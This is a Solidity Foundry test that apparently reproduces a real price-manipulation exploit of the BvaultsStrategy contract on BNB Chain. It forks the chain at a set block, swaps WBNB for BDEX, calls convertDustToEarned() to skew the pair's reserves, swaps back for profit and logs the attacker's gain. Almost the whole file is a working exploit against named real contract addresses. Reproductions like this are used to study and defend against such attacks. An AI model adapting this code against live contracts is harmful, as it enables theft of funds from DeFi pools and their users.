// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

// @Analysis
// https://twitter.com/BeosinAlert/status/1588579143830343683
// TX
// https://bscscan.com/tx/0xe7b7c974e51d8bca3617f927f86bf907a25991fe654f457991cbf656b190fe94

interface BvaultsStrategy {
    function convertDustToEarned() external;
}

interface BPair {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function getReserves() external view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast);
}


contract ContractTest is DSTest{
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 BDEX = IERC20(0x7E0F01918D92b2750bbb18fcebeEDD5B94ebB867);
    BvaultsStrategy vaultsStrategy = BvaultsStrategy(0xB2B1DC3204ee8899d6575F419e72B53E370F6B20);
    BPair Pair = BPair(0x5587ba40B8B1cE090d1a61b293640a7D86Fc4c2D);

     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        // the ankr rpc maybe dont work , please use QuickNode
        cheats.createSelectFork("bsc", 22629431);
    }

    function testExploit() public{
        address(WBNB).call{value: 34 ether}("");
        uint amountin = WBNB.balanceOf(address(this));
        WBNB.transfer(address(Pair), amountin);
        (uint BDEXReserve, uint WBNBReserve, ) = Pair.getReserves();
        uint amountout = (998 * amountin * BDEXReserve) / (1000 * WBNBReserve + 998 * amountin);
        Pair.swap(amountout, 0, address(this), "");
        vaultsStrategy.convertDustToEarned();
        uint amountBDEX = BDEX.balanceOf(address(this));
        BDEX.transfer(address(Pair), amountBDEX);
        (uint BDEXReserve1, uint WBNBReserve1, ) = Pair.getReserves();
        uint amountWBNB = (998 * amountBDEX * WBNBReserve1) / (1000 * BDEXReserve1 + 998 * amountBDEX);
        Pair.swap(0, amountWBNB, address(this), "");
        address(WBNB).call(abi.encodeWithSignature("withdraw(uint256)", 34 * 1e18));

        emit log_named_decimal_uint(
            "[End] Attacker WBNB balance after exploit",
            WBNB.balanceOf(address(this)),
            18
        );
    }

    receive() payable external{}
    

}